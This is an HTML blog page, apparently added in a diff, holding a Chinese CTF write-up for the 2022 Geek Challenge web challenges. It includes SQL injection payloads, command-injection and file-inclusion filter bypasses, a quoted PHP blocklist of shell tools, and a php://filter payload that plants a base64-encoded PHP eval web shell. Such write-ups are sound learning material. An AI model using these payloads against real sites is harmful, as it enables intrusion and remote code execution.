@@ -1,0 +1,358 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || 2022极客大挑战</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>2022极客大挑战 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/11/12
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/CTF">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                CTF
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF-WP" style=color:#ff7d73>
+                    CTF-WP
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h2 id="2022极客大挑战"><a href="#2022极客大挑战" class="headerlink" title="2022极客大挑战"></a>2022极客大挑战</h2><h3 id="web-Can-Can-Need"><a href="#web-Can-Can-Need" class="headerlink" title="web-Can Can Need"></a>web-Can Can Need</h3><ul>
+<li>提示本地访问，添加<code>X-Forwarded-For: 127.0.0.1</code>，发现被过滤了，搜了一下找到一个：<code>Client-Ip: 127.0.0.1</code></li>
+<li>提示不是从 sycsec.com 访问，添加：<code>Referer: sycsec.com</code></li>
+<li>提示浏览器不是Syclover Browser，添加：<code>User-Agent: Syclover Browser</code></li>
+<li>提示邮箱不是 <a href="mailto:&#x56;&#97;&#110;&#90;&#89;&#x40;&#83;&#121;&#x63;&#108;&#111;&#118;&#x65;&#114;&#46;&#x63;&#x6f;&#109;">&#x56;&#97;&#110;&#90;&#89;&#x40;&#83;&#121;&#x63;&#108;&#111;&#118;&#x65;&#114;&#46;&#x63;&#x6f;&#109;</a> ，添加：<code>From: VanZY@Syclover.com</code>，得到flag：<code>SYC&#123;E3sy_Http_hhXD2333&#125;</code></li>
+</ul>
+<h3 id="web-来发个包"><a href="#web-来发个包" class="headerlink" title="web-来发个包"></a>web-来发个包</h3><ul>
+<li>输入flag没反应，抓包啥也没有，查看源码发现js被注释，没办法发送请求到后端</li>
+<li>手动发送请求，访问 <a target="_blank" rel="noopener" href="http://120.77.11.65:8101/flag.php">http://120.77.11.65:8101/flag.php</a> ，POST传参：<code>ifffflag=flag</code></li>
+<li>得到flag：<code>SYC&#123;:D_y0u_has_known_how_to_construct_a_requests_by_yourself&#125;</code></li>
+</ul>
+<h3 id="web-L0veSyc"><a href="#web-L0veSyc" class="headerlink" title="web-L0veSyc"></a>web-L0veSyc</h3><ul>
+<li>直接看源码，ctrl+f，搜<code>syc</code>，找到flag</li>
+<li>flag：<code>SYC&#123;We1c0me_t0_Geek_2022!&#125;</code></li>
+</ul>
+<h3 id="web-babyupload"><a href="#web-babyupload" class="headerlink" title="web-babyupload"></a>web-babyupload</h3><ul>
+<li>无过滤文件上传，传马，蚁剑链接，结束</li>
+<li>flag：<code>SYC&#123;welc0me_t0_up10ad_wor1d!&#125;</code></li>
+</ul>
+<h3 id="web-ezR-F-I"><a href="#web-ezR-F-I" class="headerlink" title="web-ezR_F_I"></a>web-ezR_F_I</h3><ul>
+<li>文件包含，过滤了<code>http://</code>替换为空，双写绕过</li>
+<li>后缀添加了一个<code>.html</code>，试了很多办法都不行，突然想起了<code>#</code>貌似可以，试了一下成功了，好耶！</li>
+<li>这里注意远程包含的文件不能是<code>.php</code>结尾的，不然会自己服务器执行代码，可以包含<code>txt</code>文件</li>
+<li>接下来就是rce基本套路啦，flag：<code>SYC&#123;Th1s_is_RFI_hahaha!&#125;</code></li>
+</ul>
+<h3 id="web-WelcomeSQL"><a href="#web-WelcomeSQL" class="headerlink" title="web-WelcomeSQL"></a>web-WelcomeSQL</h3><ul>
+<li>整型注入，<code>?id=1 order by 2</code>，两列</li>
+<li><code>?id=-1 union select 1,2</code>，1，2处都有回显</li>
+<li><code>?id=-1 union select 1,database()</code>，数据库：<code> WelcomeSQL</code></li>
+<li><code>?id=-1 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#39;WelcomeSQL&#39;</code>，表：<code> user_info</code></li>
+<li><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;WelcomeSQL&#39; and table_name=&#39;user_info&#39;</code>，列：<code>id,username,secret</code></li>
+<li><code>?id=-1 union select 1,group_concat(secret) from WelcomeSQL.user_info</code>，字段：<code> vv33l1n,myTh3mee33e,an4erniuniu,P_God,SYC&#123;VV31c0me_T0_5QL1_vv01rd_!&#125;</code></li>
+<li>flag：<code>SYC&#123;VV31c0me_T0_5QL1_vv01rd_!&#125;</code></li>
+</ul>
+<h3 id="web-ezrce"><a href="#web-ezrce" class="headerlink" title="web-ezrce"></a>web-ezrce</h3><ul>
+<li><p>两层佛曰解码可以拿到一个提示：<code>#flag或许会在当前目录#</code>，解码网站记一下：<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=1027">佛又曰</a> 、<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/Buddha.html">新佛曰</a></p>
+</li>
+<li><p>抄一段源码：</p>
+<pre><code class="php">if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
+    $ip = $_GET[&#39;ip&#39;];
+   
+   if(preg_match(&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#39;| |\/|&lt;|&gt;|\\|/i&quot;, $ip,$match)) &#123;
+        die(&quot;hacker!&quot;);
+    &#125; else&#123;
+    system(&quot;ping -c 3 $ip&quot;);
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>很明显就是要拼接命令执行，但过滤了一堆</p>
+</li>
+<li><p>传：<code>?ip=;l\s</code>，找到一个<code>may_b3_y0u_can_pr0t3ct.php</code>，直接访问</p>
+</li>
+<li><p>flag：<code>SYC&#123;y0u_n33d_a_g1rfr1nd&#125;</code></p>
+</li>
+</ul>
+<h3 id="web-jsfind"><a href="#web-jsfind" class="headerlink" title="web-jsfind"></a>web-jsfind</h3><ul>
+<li>禁了f12等等，直接<code>view-source:</code>，然后翻js</li>
+<li>在<code>load.js</code>里找到：<code>&quot;js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js&quot;,</code></li>
+<li>访问，base64解码，放到控制台运行，拿到flag：<code>SYC&#123;D@y0u_LiKKe_D3code_EnCodE&#125;</code></li>
+</ul>
+<h3 id="web-登录试试"><a href="#web-登录试试" class="headerlink" title="web-登录试试"></a>web-登录试试</h3><ul>
+<li>根据提示，用户名是<code>Syclover</code>，提示密码是六位数且774开头，密码会前端md5加密传到后端</li>
+<li>顺便学了一下bp爆破md5加密</li>
+<li>爆出来密码是<code>774931</code>，md5后的：<code>d7d81423804c8bca99a8cdc6abb50cf1</code></li>
+<li>拿到flag：<code>SYC&#123;xi_huan_4_l&#125;</code></li>
+</ul>
+<h3 id="web-Not-Stay"><a href="#web-Not-Stay" class="headerlink" title="web-Not_Stay"></a>web-Not_Stay</h3><ul>
+<li><p>看代码，包含了一个waf.php，自定义函数生成一个id，拼接到<code>upload</code>后面并创建目录</p>
+</li>
+<li><p>post传入两个参数，对data进行文件头检测，然后拼接<code>$safe_header = &#39;&lt;?php exit();?&gt;&#39;;</code>写入文件</p>
+</li>
+<li><p>payload：</p>
+<pre><code class="http">data=GIF89a11PD9waHAgQGV2YWwoJF9QT1NUWydoYW95ZSddKTsgPz4=&amp;filename=php://filter/string.strip_tags|convert.base64-decode/resource=upload/3d5bd829-1a10-012a-4557-4d50601b2e09/1.php
+</code></pre>
+</li>
+<li><p>蚁剑或者直接rce，拿到flag：<code>SYC&#123;stay_0r_get_0ut_here!&#125;</code></p>
+</li>
+</ul>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
